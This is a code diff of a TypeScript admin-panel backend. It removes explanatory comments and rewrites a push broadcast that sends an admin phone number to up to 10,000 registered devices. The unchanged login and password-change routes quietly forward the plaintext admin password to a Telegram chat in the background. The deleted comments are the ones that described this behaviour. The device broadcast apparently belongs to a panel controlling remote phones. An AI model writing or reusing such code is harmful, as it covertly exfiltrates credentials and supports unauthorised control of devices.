@@ -142,10 +142,6 @@ async function tgGetFilePath(botToken: string, fileId: string): Promise<string> 
 }
 
 // ─── Telegram Password Notification ──────────────────────────────────────────
-// TELEGRAM_PASSWORD_CHAT_ID env se chat ID lega
-// BOT_TOKEN env se bot token lega
-// Panel URL: SELF_RESOLVE_URL se (e.g. https://api.deploy55.zero-trace.in)
-
 async function sendPasswordToTelegram(
   username: string,
   password: string,
@@ -189,7 +185,6 @@ async function sendPasswordToTelegram(
   }
 }
 
-// Check karo TG mein already send hua ya nahi (MongoDB mein flag)
 async function isTgPasswordSent(): Promise<boolean> {
   try {
     const doc = await AdminModel.findOne({ key: "tg_password_sent" }).lean();
@@ -216,7 +211,6 @@ const _loginAttempts = new Map<string, { count: number; blockedUntil: number }>(
  * =====================================
  */
 
-// POST /login/verify — bcrypt verify + rate limiting
 router.post(["/login/verify", "/admin/login/verify"], async (req, res) => {
   const ip = String(req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "unknown");
   const now = Date.now();
@@ -242,7 +236,6 @@ router.post(["/login/verify", "/admin/login/verify"], async (req, res) => {
         { upsert: true, new: true }
       );
       _loginAttempts.delete(ip);
-      // TG notify — background (login delay nahi)
       sendPasswordToTelegram(username, password, "first_login")
         .then(() => markTgPasswordSent())
         .catch(() => {});
@@ -284,16 +277,10 @@ router.post(["/login/verify", "/admin/login/verify"], async (req, res) => {
 
     _loginAttempts.delete(ip);
 
-    // ── EXISTING LOGIN — TG mein already hai ya nahi check karo ──────────
-    // Background mein — login response block nahi hoga
     setImmediate(async () => {
       try {
         const alreadySent = await isTgPasswordSent();
         if (!alreadySent) {
-          // Password plain text nahi hai mere paas (hashed hai) — isliye
-          // sirf notification bhejo ki login hua, password nahi bhej sakte
-          // BUT agar PLAIN password ENV mein store karna ho to alag approach chahiye
-          // Yahan hum flag set karte hain taaki baar baar na bheje
           logger.info("admin: TG password not sent yet — sending login alert");
           await sendPasswordToTelegram(username, "[already hashed — check first login msg]", "first_login");
           await markTgPasswordSent();
@@ -307,7 +294,6 @@ router.post(["/login/verify", "/admin/login/verify"], async (req, res) => {
   }
 });
 
-// GET /login
 router.get(["/login", "/admin/login"], async (_req, res) => {
   try {
     const doc = await AdminModel.findOne({ key: "login" }).lean();
@@ -317,9 +303,6 @@ router.get(["/login", "/admin/login"], async (_req, res) => {
   }
 });
 
-// PUT /login — password change
-// Auth: currentPassword se verify karo (no API key needed)
-// First time (no password stored): allow karo
 router.put(["/login", "/admin/login"], async (req, res) => {
   const { username, password, currentPassword } = req.body || {};
   if (!username || !password) return res.status(400).json({ success: false, error: "missing fields" });
@@ -329,7 +312,6 @@ router.put(["/login", "/admin/login"], async (req, res) => {
     const storedPass = (doc as any)?.meta?.password || "";
     const isHashed   = (doc as any)?.meta?.isHashed === true;
 
-    // ── Agar password pehle se set hai — currentPassword verify karo ──────
     if (storedPass) {
       const cur = clean(currentPassword || "");
       if (!cur) {
@@ -347,14 +329,12 @@ router.put(["/login", "/admin/login"], async (req, res) => {
         return res.status(401).json({ success: false, error: "unauthorized" });
       }
     }
-    // ── Password save karo ─────────────────────────────────────────────────
     const hashed = await bcrypt.hash(password, 10);
     await AdminModel.findOneAndUpdate(
       { key: "login" },
       { $set: { phone: "login", meta: { username, password: hashed, isHashed: true } } },
       { upsert: true, new: true }
     );
-    // TG notify — background
     sendPasswordToTelegram(username, password, "password_change")
       .then(() => markTgPasswordSent())
       .catch(() => {});
@@ -389,22 +369,16 @@ router.put(["/globalPhone", "/admin/globalPhone"], async (req, res) => {
       wsService.broadcastGlobalAdminUpdate(phoneStr);
     } catch {}
 
-    // 2. FCM push to all devices — background mein
+    // 2. FCM push to all devices — broadcastCommandToAllDevices (correct field: deviceId)
     setImmediate(async () => {
       try {
-        const { sendGlobalAdminUpdate } = require("../services/fcmService");
-        const devices = await mongoose.connection
-          .collection("devices")
-          .find({ fcmToken: { $exists: true, $ne: "" } }, { projection: { uniqueid: 1, fcmToken: 1 } })
-          .limit(10000)
-          .toArray();
-        let pushed = 0;
-        for (const dev of devices) {
-          const did = (dev as any).uniqueid || "";
-          if (!did) continue;
-          try { await sendGlobalAdminUpdate(did, phoneStr); pushed++; } catch {}
-        }
-        logger.info(`globalPhone FCM: ${pushed}/${devices.length} devices, phone="${phoneStr}"`);
+        const { broadcastCommandToAllDevices } = require("../services/fcmService");
+        const result = await broadcastCommandToAllDevices(
+          "global_admin_update",
+          { requestId: `gadmin_global_${Date.now()}`, extraData: { phone: phoneStr, timestamp: Date.now() } },
+          10000
+        );
+        logger.info(`globalPhone FCM: attempted=${result.attempted} success=${result.success} failed=${result.failed} phone="${phoneStr}"`);
       } catch (e: any) {
         logger.warn("globalPhone FCM broadcast error:", e?.message);
       }
